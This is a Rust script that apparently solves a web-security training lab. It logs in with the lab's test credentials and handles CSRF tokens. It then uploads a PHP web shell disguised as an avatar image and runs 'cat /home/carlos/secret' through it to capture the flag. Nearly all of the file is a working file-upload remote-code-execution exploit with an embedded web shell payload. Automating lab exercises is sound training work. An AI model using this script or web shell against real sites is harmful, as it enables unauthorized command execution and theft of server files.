use arboard::Clipboard;
use clap::Parser;
use reqwest::blocking::{
    Client, ClientBuilder, Response,
    multipart::{Form, Part},
};
use scraper::{Html, Selector};
use std::collections::HashMap;
use std::time::{Duration, Instant};
use url::Url;

static USERNAME: &str = "wiener";
static PASSWORD: &str = "peter";

#[derive(Parser, Debug)]
#[command(name = "Remote Code Execution Via Webshell Upload")]
#[command(bin_name = "01-remote-code-execution-via-webshell-upload")]
#[command(version, about, long_about = None)]
struct Args {
    /// Your Lab Instance URL is Required
    #[arg(short, long, value_parser = parse_url)]
    lab_url: Url,
}

fn parse_url(s: &str) -> Result<Url, String> {
    Url::parse(s).map_err(|e| format!("[-] Invalid URL: {}", e))
}

fn get_csrf_token(body: &str, selector: &Selector) -> String {
    // Parsing the HTML page with Scraper
    let document = Html::parse_document(body);

    // Using CSS Selector to find the element CSRF that contains the CSRF Token and
    // extracting the CSRF token value from the element attributes
    document
        .select(selector)
        .next()
        .and_then(|element_ref| element_ref.attr("value"))
        .map(|v| v.to_string())
        .expect("[-] CSRF Token Not Found")
}

fn main() -> Result<(), reqwest::Error> {
    let start_time: Instant = Instant::now();

    let args = Args::parse();
    let lab_url = args.lab_url.as_str().trim_end_matches("/");

    let login_csrf_token_selector: Selector = Selector::parse("form input[name=csrf]").unwrap();
    let my_avatar_upload_csrf_token_selector: Selector =
        Selector::parse("form#avatar-upload-form input[name=csrf]").unwrap();

    // Initialising the reqwest client
    // https://docs.rs/reqwest/latest/reqwest/blocking/struct.Client.html
    // https://docs.rs/reqwest/latest/reqwest/blocking/struct.ClientBuilder.html
    // https://docs.rs/reqwest/latest/reqwest/blocking/struct.ClientBuilder.html#method.cookie_store
    let client: Client = ClientBuilder::new().cookie_store(true).build()?;

    // https://docs.rs/arboard/3.5.0/arboard/struct.Clipboard.html
    let mut clipboard = Clipboard::new().unwrap();

    // Making a GET request to the given url
    // https://docs.rs/reqwest/latest/reqwest/blocking/struct.Response.html
    let response: Response = client
        .get(format!("{}/login", lab_url))
        .send()
        .expect("[-] Failed to make the GET request");

    // Extracting the body from the response
    let body: String = response.text().expect("[-] Failed to read response text");

    // Getting the CSRF token for the /login page
    let login_page_csrf_token: String = get_csrf_token(&body, &login_csrf_token_selector);
    println!("[+] Login CSRF Token: {}", login_page_csrf_token);

    // Generating the login form data
    let mut data: HashMap<&str, &str> = HashMap::new();
    data.insert("username", USERNAME);
    data.insert("password", PASSWORD);
    data.insert("csrf", &login_page_csrf_token);

    // Logging in as the given user. This request responds with the /my-account?id=wiener page
    let response: Response = client
        .post(format!("{}/login", lab_url))
        .form(&data)
        .send()
        .expect("[-] Failed to login as the given user");

    // Extracting the body from the response
    let body: String = response.text().expect("[-] Failed to read response text");

    // Getting the CSRF token from the /my-account?id=wiener page for the uploading avatar
    let my_avatar_upload_csrf_token: String =
        get_csrf_token(&body, &my_avatar_upload_csrf_token_selector);
    println!(
        "[+] My Avatar Upload CSRF Token: {}",
        &my_avatar_upload_csrf_token
    );

    // Generating the web shell payload to upload
    // https://docs.rs/reqwest/latest/reqwest/multipart/struct.Part.html
    // https://docs.rs/reqwest/latest/reqwest/multipart/struct.Part.html#method.bytes
    // https://docs.rs/reqwest/latest/reqwest/multipart/struct.Part.html#method.file_name
    // https://docs.rs/reqwest/latest/reqwest/multipart/struct.Part.html#method.mime_str
    let payload: Part = Part::bytes("<?php echo system($_GET['command']); ?>".as_bytes())
        .file_name("web-shell.php")
        .mime_str("application/x-php")
        .expect("[-] Failed to generate payload");

    // Generating avatar upload form data
    // https://docs.rs/reqwest/latest/reqwest/multipart/struct.Form.html
    let form: Form = Form::new()
        .text("user", USERNAME)
        .text("csrf", my_avatar_upload_csrf_token)
        .part("avatar", payload);

    // Uploading the Payload
    let response: Response = client
        .post(format!("{}/my-account/avatar", lab_url))
        .multipart(form)
        .send()
        .expect("[-] Failed to upload the payload");

    // If payload upload successful
    if response.status() == 200 {
        // Trying to read the secret
        let response: Response = client
            .get(format!(
                "{}/files/avatars/web-shell.php?command=cat /home/carlos/secret",
                lab_url
            ))
            .send()
            .expect("[-] Failed to get secret");

        if response.status() == 200 {
            // When I was trying this lab, the response contains the flag duplicated like this: <flag><flag>
            // To get the correct flag, simply split the string in half and compare the two halves.
            // If they are equal, keep only one half of the flag
            let mut flag: String = response.text().expect("[-] Failed to read secret");

            let half = &flag.len() / 2;

            if flag[..half] == flag[half..] {
                flag = flag[..half].to_string();
            }

            println!("[+] Flag: {}", flag);

            // https://docs.rs/arboard/3.5.0/arboard/struct.Clipboard.html#method.set_text
            clipboard
                .set_text(flag)
                .expect("[-] Failed to copy flag to clipboard");

            println!("[+] Flag copied to clipboard")
        }
    }

    let total_time: Duration = Instant::elapsed(&start_time);
    println!("[+] Total time taken: {}", total_time.as_secs_f64());

    Ok(())
}
